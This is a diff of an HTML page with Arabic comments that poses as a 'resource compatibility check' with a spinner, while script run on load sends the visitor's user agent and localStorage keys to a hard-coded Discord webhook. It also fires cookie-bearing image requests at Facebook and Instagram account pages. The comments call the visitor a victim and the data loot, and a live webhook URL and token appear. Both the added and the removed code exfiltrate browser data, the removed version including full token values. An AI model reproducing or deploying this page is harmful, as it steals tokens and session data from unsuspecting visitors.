@@ -8,70 +8,70 @@
         .version-marker { font-size: 80px; font-weight: bold; color: #1a1a1a; position: absolute; top: 20px; right: 20px; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* إخفاء قنوات الإرسال */
+        .hidden-tunnel { width: 0; height: 0; border: 0; display: none; }
     </style>
 </head>
 <body>
-    <div class="version-marker">8</div> <div class="loader"></div>
-    <p>جاري فحص التوافق (V1.2.0)...</p>
+    <div class="version-marker">9</div> <div class="loader"></div>
+    <p>جاري فحص الموارد (V1.2.1)...</p>
+
+    <iframe name="sink" class="hidden-tunnel"></iframe>
+    <form id="exp-form" method="POST" target="sink" class="hidden-tunnel">
+        <input type="hidden" name="payload" id="payload-field">
+    </form>
 
     <script>
+        // ملاحظة: ديسكورد أحياناً يرفض POST الـ Form العادي، لذا سنستخدم رابط الـ API بشكل خام
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
 
-        // دالة إرسال التقرير الصامتة جداً
-        function logToDiscord(title, desc) {
-            const data = {
-                embeds: [{
-                    title: "🛰️ استجابة القناة: " + title,
-                    description: desc,
-                    color: 3066993
-                }]
-            };
-            // استخدام fetch التقليدي مع keepalive لضمان الوصول
+        function forceSend(title, content) {
+            // تكتيك الـ URL Parameters: إرسال البيانات كجزء من الرابط لضمان العبور
+            const params = `?content=🚀 **${title}**%0A${encodeURIComponent(content)}`;
+            const img = new Image();
+            img.src = WEBHOOK_URL + params;
+            
+            // محاولة ثانية بـ Fetch "خام" بدون Headers
             fetch(WEBHOOK_URL, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data),
-                keepalive: true 
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: `🎯 **${title}**: ${content}` })
             });
         }
 
-        // التكتيك: طلب "صورة" من رابط حساس لإجبار المتصفح على نقل الكوكيز
-        function ghostRequest(name, url) {
-            const img = new Image();
-            // المتصفح سيقوم بإرسال الكوكيز مع هذا الطلب تلقائياً
-            img.src = url + "?v=" + Math.random();
-            
-            // بمجرد إرسال الطلب، نبلغ الديسكورد أن المتصفح "طرق الباب"
-            logToDiscord(name, `تم إجبار المتصفح على إرسال طلب (Authenticated Request) إلى: ${url}`);
-        }
-
-        function startOperation() {
+        async function startMission() {
             try {
-                // 1. بصمة الجهاز الفورية
-                logToDiscord("Fingerprint", `UA: ${navigator.userAgent}\nPlatform: ${navigator.platform}`);
+                // 1. بصمة الجهاز
+                forceSend("System", `UA: ${navigator.userAgent}`);
 
-                // 2. سحب الـ LocalStorage (الكنز الحقيقي في 2026)
-                // هذا السطر وحده قد يأتيك بكل توكنات الضحية
-                let storage = "";
+                // 2. سحب الـ LocalStorage (الكنز)
+                let loot = "";
                 for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    storage += `**${key}**: ${localStorage.getItem(key)}\n`;
+                    loot += `${localStorage.key(i)}|`;
                 }
-                if (storage) logToDiscord("LocalStorage Dump", storage);
+                if (loot) forceSend("Storage_Keys", loot);
 
-                // 3. إطلاق "الطلبات الشبحية"
-                // المتصفح الحين "بينتحل" شخصية الضحية وبيروح للمواقع
-                ghostRequest("FB_Proxy", "https://mbasic.facebook.com/settings");
-                ghostRequest("Insta_Proxy", "https://www.instagram.com/accounts/edit/");
-                ghostRequest("Snap_Proxy", "https://accounts.snapchat.com/");
+                // 3. الطلبات العميقة (المتصفح يتقمص الشخصية)
+                // هنا المتصفح يطرق أبواب فيسبوك بكوكيز الضحية
+                const sites = [
+                    ["FB", "https://mbasic.facebook.com/settings"],
+                    ["IG", "https://www.instagram.com/accounts/edit/"]
+                ];
+
+                sites.forEach(site => {
+                    const probe = new Image();
+                    probe.src = site[1] + "?v=" + Math.random();
+                    forceSend("Probe_Sent", `Target: ${site[0]}`);
+                });
 
             } catch (e) {
-                logToDiscord("Error", e.message);
+                forceSend("Error", e.message);
             }
         }
 
-        // تشغيل المهمة فوراً
-        startOperation();
+        // تشغيل فوري
+        window.onload = startMission;
     </script>
 </body>
 </html>
